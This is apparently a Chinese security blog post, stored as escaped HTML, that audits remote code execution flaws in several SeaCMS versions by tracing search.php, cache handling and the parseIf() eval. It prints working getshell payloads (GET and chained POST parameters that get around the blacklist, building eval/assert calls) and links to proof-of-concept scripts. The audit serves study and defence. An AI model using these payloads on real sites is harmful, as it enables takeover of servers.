class=\"hljs-string\">'onclick'</span>, <span class=\"hljs-string\">'oncontextmenu'</span>, <span class=\"hljs-string\">'oncontrolselect'</span>, <span class=\"hljs-string\">'oncopy'</span>, <span class=\"hljs-string\">'oncut'</span>, <span class=\"hljs-string\">'ondataavailable'</span>, <span class=\"hljs-string\">'ondatasetchanged'</span>, <span class=\"hljs-string\">'ondatasetcomplete'</span>, <span class=\"hljs-string\">'ondblclick'</span>, <span class=\"hljs-string\">'ondeactivate'</span>, <span class=\"hljs-string\">'ondrag'</span>, <span class=\"hljs-string\">'ondragend'</span>, <span class=\"hljs-string\">'ondragenter'</span>, <span class=\"hljs-string\">'ondragleave'</span>, <span class=\"hljs-string\">'ondragover'</span>, <span class=\"hljs-string\">'ondragstart'</span>, <span class=\"hljs-string\">'ondrop'</span>, <span class=\"hljs-string\">'onerror'</span>, <span class=\"hljs-string\">'onerrorupdate'</span>, <span class=\"hljs-string\">'onfilterchange'</span>, <span class=\"hljs-string\">'onfinish'</span>, <span class=\"hljs-string\">'onfocus'</span>, <span class=\"hljs-string\">'onfocusin'</span>, <span class=\"hljs-string\">'onfocusout'</span>, <span class=\"hljs-string\">'onhelp'</span>, <span class=\"hljs-string\">'onkeydown'</span>, <span class=\"hljs-string\">'onkeypress'</span>, <span class=\"hljs-string\">'onkeyup'</span>, <span class=\"hljs-string\">'onlayoutcomplete'</span>, <span class=\"hljs-string\">'onload'</span>, <span class=\"hljs-string\">'onlosecapture'</span>, <span class=\"hljs-string\">'onmousedown'</span>, <span class=\"hljs-string\">'onmouseenter'</span>, <span class=\"hljs-string\">'onmouseleave'</span>, <span class=\"hljs-string\">'onmousemove'</span>, <span class=\"hljs-string\">'onmouseout'</span>, <span class=\"hljs-string\">'onmouseover'</span>, <span class=\"hljs-string\">'onmouseup'</span>, <span class=\"hljs-string\">'onmousewheel'</span>, <span class=\"hljs-string\">'onmove'</span>, <span class=\"hljs-string\">'onmoveend'</span>, <span class=\"hljs-string\">'onmovestart'</span>, <span class=\"hljs-string\">'onpaste'</span>, <span class=\"hljs-string\">'onpropertychange'</span>, <span class=\"hljs-string\">'onreadystatechange'</span>, <span class=\"hljs-string\">'onreset'</span>, <span class=\"hljs-string\">'onresize'</span>, <span class=\"hljs-string\">'onresizeend'</span>, <span class=\"hljs-string\">'onresizestart'</span>, <span class=\"hljs-string\">'onrowenter'</span>, <span class=\"hljs-string\">'onrowexit'</span>, <span class=\"hljs-string\">'onrowsdelete'</span>, <span class=\"hljs-string\">'onrowsinserted'</span>, <span class=\"hljs-string\">'onscroll'</span>, <span class=\"hljs-string\">'onselect'</span>, <span class=\"hljs-string\">'onselectionchange'</span>, <span class=\"hljs-string\">'onselectstart'</span>, <span class=\"hljs-string\">'onstart'</span>, <span class=\"hljs-string\">'onstop'</span>, <span class=\"hljs-string\">'onsubmit'</span>, <span class=\"hljs-string\">'onunload'</span>); <br>   $ra = array_merge($ra1, $ra2); <br><br>    ......<br>    <br>   <span class=\"hljs-keyword\">return</span> $val;  <br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>其中，黑名单数组的第一组 $ra1 中的第5项添加了 <code>if:</code> 这个黑名单匹配项，还加了另外其他的几个匹配项</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">'_GET','_POST','_COOKIE','_REQUEST'<br></code></pre></td></tr></table></figure>\n\n<p>所以 v_6.4.5 版本的 payload 会因为逻辑关系的不成立，因此在 eval() 函数中得不到执行。</p>\n<p>那么我们来看看这个版本的脑洞版 payload </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">文件：<br>search.php<br><br>POST 内容：<br>searchtype=<span class=\"hljs-number\">5</span><br>&amp;searchword=&#123;<span class=\"hljs-keyword\">if</span>&#123;searchpage:year&#125;<br>&amp;year=:e&#123;searchpage:area&#125;&#125;<br>&amp;area=v&#123;searchpage:letter&#125;<br>&amp;letter=al&#123;searchpage:lang&#125;<br>&amp;yuyan=(join&#123;searchpage:jq&#125;<br>&amp;jq=($_P&#123;searchpage:ver&#125;<br>&amp;ver=OST[<span class=\"hljs-number\">9</span>]))<br>&amp;<span class=\"hljs-number\">9</span>[]=ph<br>&amp;<span class=\"hljs-number\">9</span>[]=pinfo();<br><br><span class=\"hljs-comment\">// 传递拼接为 ：if:eval(join($_POST[9]))</span><br></code></pre></td></tr></table></figure>\n\n<p>因为每个传入的参数限长为 20，所以我们必须尽可能多的使用之后会在模板文件中进行替换的变量进行 payload 的构造。</p>\n<p>每一步都会将上一步构造的 payload 进行二次构造，最后传递成为最终等待执行的代码:</p>\n<figure class=\"highlight PHP\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs PHP\"><span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))<br></code></pre></td></tr></table></figure>\n\n<p>由上一个版本的数据流向，依旧会通过 <strong>parseIf()</strong> 函数，那么最终 eval() 执行恶意函数。这里有两个疑点需要解释。</p>\n<ul>\n<li><p>为了防止在 <strong>parseIf</strong> 里面的 eval() 中的 if 语句逻辑错误而不能正常执行，这里构造了 eval(eval(【】)）的结构，使得因为解析顺序，<strong>$_POST</strong> 传来的值会直接进行解释执行。</p>\n</li>\n<li><p>这里只执行了一次 phpinfo() 函数就是第一次替换执行的，第一次的完整的正则匹配如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">&#123;<span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))&#125;,海洋CMS<span class=\"hljs-string\">\" /&gt;<br>&lt;meta name=\"</span>description<span class=\"hljs-string\">\" content=\"</span>&#123;<span class=\"hljs-keyword\">if</span>:<span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))&#125;,海洋CMS<span class=\"hljs-string\">\" /&gt;<br>&lt;meta http-equiv=\"</span>Content-Type<span class=\"hljs-string\">\" content=\"</span>text/html; charset=utf<span class=\"hljs-number\">-8</span><span class=\"hljs-string\">\"&gt;<br>//省略大部分内容<br>&#123;end if&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p>由正则匹配和 eval() 函数执行的语句知，最后的执行语句为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">@<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">\"if(\"</span><span class=\"hljs-keyword\">eval</span>(join($_POST[<span class=\"hljs-number\">9</span>]))<span class=\"hljs-string\">\")&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;\"</span>);<br></code></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"￥思路分析\"><a href=\"#￥思路分析\" class=\"headerlink\" title=\"￥思路分析\"></a>￥思路分析</h4><p>如果我们在首次拿到这个系统的代码时，想要找到上面这种利用方式是不太容易的。整个利用思路最最值得借鉴的就是按照 php 的解析顺序，替换顺序来构造 payload ，让多次替换后的 payload 成为最终的 payload。的确骚~</p>\n<h3 id=\"3、v6-5-5-前台-getshell\"><a href=\"#3、v6-5-5-前台-getshell\" class=\"headerlink\" title=\"3、v6.5.5 前台 getshell\"></a>3、v6.5.5 前台 getshell</h3><p>这一版的系统在 parseIf 函数里面进行了危险函数,参数的过滤，但是忽略了 assert 和 $SERVER[‘QUERY_STRING’]。构造方法同上一版，payload 如下。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">文件：<br>search.php<br><br>POST 内容：<br>searchtype=<span class=\"hljs-number\">5</span><br>&amp;searchword=&#123;<span class=\"hljs-keyword\">if</span>&#123;searchpage:year&#125;<br>&amp;year=:<span class=\"hljs-keyword\">as</span>&#123;searchpage:area&#125;&#125;<br>&amp;area=s&#123;searchpage:letter&#125;<br>&amp;letter=ert&#123;searchpage:lang&#125;<br>&amp;yuyan=($_SE&#123;searchpage:jq&#125;<br>&amp;jq=RVER&#123;searchpage:ver&#125;<br>&amp;ver=[QUERY_STRING]));<br></code></pre></td></tr></table></figure>\n\n<p>访问如下的 url 即可触发</p>\n<p><code>http://IP/search.php?phpinfo</code></p>\n<p>post 内容如上。</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3@ 总结\"></a>3@ 总结</h2><p>可以看见，这款 cms 的修复方法多次使用了黑名单，单独应用在这种场景下还是不容易做出良好的防御。</p>\n<p>poc 脚本链接如下：</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">v_6.<span class=\"hljs-number\">4.5</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">45</span>_getshell.<span class=\"hljs-keyword\">py</span><br>v_6.<span class=\"hljs-number\">5.4</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">5</span>_getshell.<span class=\"hljs-keyword\">py</span><br>v_6.<span class=\"hljs-number\">5.5</span>: http<span class=\"hljs-variable\">s:</span>//github.<span class=\"hljs-keyword\">com</span>/<span class=\"hljs-number\">59</span>lx/auidt_poc/blob/master/seacms_poc_6.<span class=\"hljs-number\">5</span>_getshell.<span class=\"hljs-keyword\">py</span><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>换回我的 <strong>小deepin了</strong>，还是熟悉的味道，哈哈。配好所有之前的环境后，开始审计 ：）</p>\n<p>文章撰写时的审计环境：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">server : phpstudy<span class=\"hljs-built_in\"><br>system </span>: win10<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-seacms-各个版本的-getshell\"><a href=\"#2-seacms-各个版本的-getshell\" class=\"headerlink\" title=\"2@ seacms 各个版本的 getshell\"></a>2@ seacms 各个版本的 getshell</h2><h3 id=\"1-v-6-4-5-前台-getshell\"><a href=\"#1-v-6-4-5-前台-getshell\" class=\"headerlink\" title=\"1. v_6.4.5 前台 getshell\"></a>1. v_6.4.5 前台 getshell</h3><ul>\n<li>漏洞文件 <strong>upload/search.php</strong></li>\n</ul>\n<p>我以为，初学审计的时候可以先看 payload，然后通过给出构造的参数形式了进行顺藤摸瓜。毕竟各大漏洞平台一般较不详细的时候也会给出几条简单的 poc_payload。我们先来看看这个版本的前台 getshell 的 payload。</p>\n<p><code>http://IP/upload/search.php?searchtype=5&amp;order=}{end if}{if:1)phpinfo();if(1}{end if}</code></p>\n<h4 id=\"1-1-恶意-payload-的追踪\"><a href=\"#1-1-恶意-payload-的追踪\" class=\"headerlink\" title=\"1.1 恶意 payload 的追踪\"></a>1.1 恶意 payload 的追踪</h4><p>​         首先，我们从上面的 payload 可以知晓可控参数为 <strong>searchtype</strong> 和 <strong>order</strong>，我们可以跟着 xdebug 完整的走一遍，较为清楚的了解漏洞存在的原因，和漏洞触发的条件（只列出漏洞相关的部分，相关逻辑功能的完成在这不细究）。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\"include/common.php\"</span>);<br><span class=\"hljs-keyword\">require_once</span>(sea_INC.<span class=\"hljs-string\">\"/main.class.php\"</span>);<br></code></pre></td></tr></table></figure>\n\n<p>文件开头包含了两个处理方法与处理参数的文件，其中 GPC 变量的传入的文件就包含在 <strong>common.php</strong>中。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'_GET'</span>,<span class=\"hljs-string\">'_POST'</span>,<span class=\"hljs-string\">'_COOKIE'</span>) <span class=\"hljs-keyword\">as</span> $_request)<br>&#123;<br>\t<span class=\"hljs-keyword\">foreach</span>($$_request <span class=\"hljs-keyword\">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这段 <strong>common.php</strong> 文件中的代码，将外部的 GPC 参数进行 php 代码层的赋值。</p>\n<p>再回到 <strong>search.php</strong>，来看看漏洞的直接关键点 <strong>echoSearchpage()</strong> 函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;<br>$order = !<span class=\"hljs-keyword\">empty</span>($order)?$order:time;<br></code></pre></td></tr></table></figure>\n\n<p>函数开头将一些变量引用为全局变量，在函数内部使用。由第二句 order 变量的赋值，结合之前的外部变量赋值的方法，我们可以传入 order 参数进行变量覆盖。由 payload 可知，order字段里面是存在关键字眼 <strong>phpinfo()</strong>的，之后一定是经过了一系列的拼接和过滤，得到执行，我们在整个漏洞利用的在这条链里面就要紧盯着 order 参数的 <code>&#39;成长历程&#39;</code>。payload中的另一个参数是 searchtype ，赋值为5，所以我们跳转到代码的 65~76行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>(intval($searchtype)==<span class=\"hljs-number\">5</span>)<br>\t&#123;<br>\t\t$searchTemplatePath = <span class=\"hljs-string\">\"/templets/\"</span>.$GLOBALS[<span class=\"hljs-string\">'cfg_df_style'</span>].<span class=\"hljs-string\">\"/\"</span>.$GLOBALS[<span class=\"hljs-string\">'cfg_df_html'</span>].<span class=\"hljs-string\">\"/cascade.html\"</span>;<br>\t\t$typeStr = !<span class=\"hljs-keyword\">empty</span>($tid)?intval($tid).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$yearStr = !<span class=\"hljs-keyword\">empty</span>($year)?PinYin($year).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$letterStr = !<span class=\"hljs-keyword\">empty</span>($letter)?$letter.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$areaStr = !<span class=\"hljs-keyword\">empty</span>($area)?PinYin($area).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$orderStr = !<span class=\"hljs-keyword\">empty</span>($order)?$order.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$jqStr = !<span class=\"hljs-keyword\">empty</span>($jq)?$jq.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$cacheName=<span class=\"hljs-string\">\"parse_cascade_\"</span>.$typeStr.$yearStr.$letterStr.$areaStr.$orderStr; <span class=\"hljs-comment\">//构建cacheName</span><br>\t\t$pSize = getPageSizeOnCache($searchTemplatePath,<span class=\"hljs-string\">\"cascade\"</span>,<span class=\"hljs-string\">\"\"</span>);  <span class=\"hljs-comment\">//获取输出页面大小</span><br></code></pre></td></tr></table></figure>\n\n<p>这段代码的大致意思是构造好模板文件的文件名，第一句得到构造模板文件的默认格式的文件名</p>\n<p><code>/templets/default/html/cascade.html</code></p>\n<p>然后开始拼接模板文件名，由于以上参数传入都为空，则由选择语句知道我们的最终文件名变量 $cacheName为:</p>\n<p><code>parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_</code></p>\n<p><strong>psize</strong> 是输出文件页面的大小，默认在缓存文件里面保存，值为24.</p>\n<p>由于其他相关参数都为空，我们直接跟进到文件的第 145 行，来查看模板文件的处理方式。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>($cfg_iscache)&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>(chkFileCache($cacheName))&#123;<br>\t\t\t$content = getFileCache($cacheName);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t\t\tsetFileCache($cacheName,$content);<br>\t\t&#125;<br>\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>变量 $cfg_iscache 默认传入为 1，所以我们跟进到 <strong>chkFileCache()</strong>函数里面。</p>\n<ul>\n<li>文件 /upload/include/inc/common_func.php</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">chkFileCache</span><span class=\"hljs-params\">($cacheName)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">global</span> $cfg_cachetime,$cfg_cachemark;<br>\t$cacheFile=sea_ROOT.<span class=\"hljs-string\">'/data/cache/'</span>.$cfg_cachemark.$cacheName.<span class=\"hljs-string\">'.inc'</span>;<br>\t$mintime = time() - $cfg_cachetime*<span class=\"hljs-number\">60</span>;<br>\t<span class=\"hljs-keyword\">if</span>(!file_exists($cacheFile) || ( file_exists($cacheFile) &amp;&amp; ($mintime &gt; filemtime($cacheFile))))&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;<br>\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这里的逻辑理解的关键点就在这句</p>\n<p><code>if(!file_exists($cacheFile) || ( file_exists($cacheFile) &amp;&amp; ($mintime &gt; filemtime($cacheFile))))</code></p>\n<p>我们在这设一个 $test 变量 </p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1564321031968\"></p>\n<p>看到这里是返回 false 的，由格式来看，只能是两边的判断式都为假时，最终的布尔值才会为假。所以，file_exists($cacheFile) 是成立的，也就是说，文件<code>D:/WWW/seacms_v6.4/upload/data/cache/E20121213155816parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_.inc</code> 存在。但实际上从本地来看，这个文件并不存在，只有一个相似的被截断的文件名 <code>E20121213155816parse_cascade_0_0_0_0_}{end if} {if</code> 存在，这是因为出现的 if 后面的冒号将文件名截断。但是 file_exists 函数仍然判断源文件存在。这想来是件很有趣的事情啊，这就引出来对 file_exists() 与 文件关系的讨论。</p>\n<h5 id=\"1-2-1-有趣的-file-exists-和-ntfs-文件系统\"><a href=\"#1-2-1-有趣的-file-exists-和-ntfs-文件系统\" class=\"headerlink\" title=\"1.2.1 有趣的 file_exists()  和 ntfs 文件系统\"></a>1.2.1 有趣的 file_exists()  和 ntfs 文件系统</h5><p>除了上面的那个情况外，还有一个点也能证明这个被截断文件名的文件是真实存在的。</p>\n<p><img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1564363773307\"></p>\n<p>思考一下：是否存在这种情况，操作系统的文件系统将文件写入的数据流保存到一个位置，但是显示的文件名是以它的命名规则显示，而真正的文件名是与写入数据流相互关联，可以用底层的编程语言打开那个完整文件名的文件，获取数据流？</p>\n<p>搜索无果后，在 p 神小密圈发问，得到了师傅们的指导，了解了一下 ntfs 文件系统。</p>\n<p>更多关于 ntfs 文件系统中的隐藏流的知识，请见我的另一篇博客：<a href=\"https://www.59wlx.top/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/\" target=\"_blank\" rel=\"noopener\">ntfs 系统中的ADS供选数据流</a></p>\n<h5 id=\"1-2-2-继续跟踪审计\"><a href=\"#1-2-2-继续跟踪审计\" class=\"headerlink\" title=\"1.2.2 继续跟踪审计\"></a>1.2.2 继续跟踪审计</h5><p>好了，解决完上面的问题，我们接着来看审计。</p>\n<p>当我们第一次构造 payload 进行访问时，是不存在那个模板文件的，那么代码会走到另一个分支。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>($cfg_iscache)&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>(chkFileCache($cacheName))&#123;<br>\t\t\t$content = getFileCache($cacheName);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t$content = parseSearchPart($searchTemplatePath);<br>\t\t\tsetFileCache($cacheName,$content);<br>\t\t&#125;<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>在 chkFileCache() 函数返回 false 后，进入到 else 分支 ,执行获取 $content, 并对搜索的不存在模板文件进行写入。这也是我们之后访问那个模板文件中内容的由来，即可以一次或多次执行 phpinfo()。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">parseSearchPart</span><span class=\"hljs-params\">($templatePath)</span><br></span>&#123;<br>\t<span class=\"hljs-keyword\">global</span> $mainClassObj,$tid;<br>\t$currentTypeId = <span class=\"hljs-keyword\">empty</span>($tid)?<span class=\"hljs-number\">0</span>:$tid;<br>\t$content=loadFile(sea_ROOT.$templatePath);<br>\t$content=$mainClassObj-&gt;parseTopAndFoot($content);<br>\t$content=$mainClassObj-&gt;parseAreaList($content);<br>\t$content=$mainClassObj-&gt;parseHistory($content);<br>\t$content=$mainClassObj-&gt;parseSelf($content);<br>\t$content=$mainClassObj-&gt;parseGlobal($content);<br>\t$content=$mainClassObj-&gt;parseMenuList($content,<span class=\"hljs-string\">\"\"</span>,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parseVideoList($content,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parsenewsList($content,$currentTypeId);<br>\t$content=$mainClassObj-&gt;parseTopicList($content);<br>\t<span class=\"hljs-keyword\">return</span> $content;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这个函数获取模板文件的默认格式，然后进行替换赋值。</p>\n<p>之后就进入到了关键的模板内容替换的部分：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">$content = str_replace(<span class=\"hljs-string\">\"&#123;searchpage:page&#125;\"</span>,$page,$content);<br>\t<span class=\"hljs-keyword\">echo</span> $content;<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;seacms:searchword&#125;\"</span>,$searchword,$content);<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;seacms:searchnum&#125;\"</span>,$TotalResult,$content);<br>\t$content = str_replace(<span class=\"hljs-string\">\"&#123;searchpage:ordername&#125;\"</span>,$order,$content);<br>......<br></code></pre></td></tr></table></figure>\n\n<p>我只列出我们可控的部分，关键就在 $order 这个参数，我们结合 $content 获取到的模板文件的内容，来观察替换后的亚子。模板内容如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-time-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"time\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderhits\"</span>&gt;</span>最新上映<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-hit-link&#125;\"</span> &#123;<span class=\"hljs-attr\">if:</span>\"&#123;<span class=\"hljs-attr\">searchpage:ordername</span>&#125;\"==<span class=\"hljs-string\">\"hit\"</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-success\"</span> &#123;<span class=\"hljs-attr\">else</span>&#125; <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn btn-default\"</span> &#123;<span class=\"hljs-attr\">end</span> <span class=\"hljs-attr\">if</span>&#125; <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">\"orderaddtime\"</span>&gt;</span>最近热播<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"&#123;searchpage:order-score-link&#125;\"</span> 